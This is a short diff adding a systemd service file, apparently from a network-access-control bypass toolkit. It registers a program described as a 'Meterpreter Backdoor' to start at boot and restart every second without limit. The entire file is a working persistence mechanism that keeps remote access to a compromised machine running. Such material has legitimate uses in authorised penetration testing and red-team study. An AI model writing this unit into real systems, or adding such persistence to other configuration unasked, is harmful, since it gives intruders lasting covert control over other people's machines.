@@ -1,0 +1,16 @@
+[Unit]
+Description=Meterpreter Backdoor
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+PIDFile=/var/run/backdoor.pid
+Restart=always
+RemainAfterExit=no
+RestartSec=1
+WorkingDirectory=/opt/NacBypass2.0
+ExecStart=/opt/NacBypass2.0/backdoor
+
+[Install]
+WantedBy=multi-user.target
